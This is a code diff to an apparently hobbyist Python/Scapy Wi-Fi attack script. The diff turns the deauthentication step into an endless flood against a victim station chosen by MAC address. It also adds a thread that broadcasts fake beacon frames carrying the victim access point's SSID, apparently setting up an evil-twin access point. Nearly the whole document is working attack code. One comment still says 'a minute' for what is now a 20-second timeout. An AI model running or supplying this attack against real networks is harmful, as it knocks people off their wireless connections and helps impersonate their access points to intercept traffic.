@@ -8,7 +8,7 @@ from progress.spinner import Spinner, MoonSpinner, PixelSpinner, PieSpinner, Lin
 from scapy.all import *
 import time
 import netifaces
-from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp
+from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beacon, Dot11ProbeResp, Dot11ProbeReq
 
 mac = ''
 client_AP = dict()
@@ -169,7 +169,7 @@ def sniffer(iface, ch):
     else:
         from_ch = 1
         to_ch = 14
-    timeout = time.time() + 60  # a minute  from now
+    timeout = time.time() + 20  # a minute  from now
     while True:
         os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
         from_ch = from_ch % to_ch + 1
@@ -215,12 +215,29 @@ def output_client(net):
 
 
 def deauth(target_mac, iface):
-    global  client_AP
+    global client_AP
     bssid = client_AP[target_mac]['BSSID']
-    print("[+] attacking client ", target_mac, " on network ", bssid)
-    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
-    frame = RadioTap() / dot11 / Dot11Deauth()
-    sendp(frame, iface=iface, count=2000, inter=0.)
+    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid)
+    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)
+    sendp(frame, iface=iface, loop=1, inter=0.1, verbose=0)
+
+
+# send beacon frames in an infinite loop inorder to identify as the chosen AP for the attack
+def send_beacon(iface, net):
+    global mac
+    global AP
+    # SSID (name of access point)
+    ssid = AP[net]
+    # 802.11 frame
+    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
+    # beacon layer
+    beacon = Dot11Beacon()
+    # putting ssid in the frame
+    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
+    # stack all the layers and add a RadioTap
+    frame = RadioTap() / dot11 / beacon / essid
+    # send the frame in layer 2 every 200 milliseconds forever
+    sendp(frame, inter=0.2, iface=iface, loop=1, verbose=0)
 
 
 if __name__ == "__main__":
@@ -244,4 +261,9 @@ if __name__ == "__main__":
     network = input("enter the mac address of the network you want to attack: ")
     output_client(network)
     victim = input("enter the mac address of the station you want to attack: ")
-    deauth(victim, interface)
+    sleep(1)
+    print("[+] attacking station ", victim)
+    Thread(target=deauth, args=(victim, interface)).start()
+    sleep(2)
+    print("[+]sending beacon frames with victim access point's SSID")
+    Thread(target=send_beacon, args=(interface, network)).start()
